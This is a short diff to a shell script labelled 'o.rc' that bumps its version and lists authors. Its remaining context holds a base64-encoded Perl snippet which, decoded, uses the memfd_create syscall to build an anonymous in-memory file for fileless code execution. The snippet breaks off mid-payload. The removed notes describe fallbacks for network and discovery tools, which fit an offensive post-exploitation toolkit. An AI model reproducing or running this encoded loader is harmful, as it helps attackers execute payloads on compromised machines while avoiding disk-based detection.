@@ -1,15 +1,8 @@
 #!/bin/sh
 # o.rc
-OVERSION="0.4"
+OVERSION="0.5"
 # NOTES
-# new features! see readme/gethelp
-# all the non-POSIX for loops have been removed
-# all the SIGs in trap changed
-# aliasing echo to /bin/echo to get around POSIX echo having no flags
-# removed the non-POSIX [[ stuff ]]
-# curl and dig now have wget and host as backups
-# ipcalc should now be optional
-# support for ip instead of ifconfig and arp
+#authors: March, Darren Martyn, Ulrich Bernstien
 
 memfda=$(cat << EOF
 IyEvdXNyL2Jpbi9lbnYgcGVybAp1c2Ugd2FybmluZ3M7CnVzZSBzdHJpY3Q7CgokfD0xOwoKbXkgJG5hbWUgPSAiIjsKbXkgJGZkID0gc3lzY2FsbCgzMTksICRuYW1lLCAxKTsKaWYgKC0xID09ICRmZCkgewoJZGllOwp9CgpwcmludCAiZmQgJGZkXG4iOwoKb3BlbiAobXkgJEZILCAnPiY9Jy4kZmQpIG9yIGRpZTsKc2VsZWN0ICgoc2VsZWN0KCRGSCksICR8PTEpIFswXSk7CgpwcmludCAkRkggcGFjayBxL0gqLywgcS8K
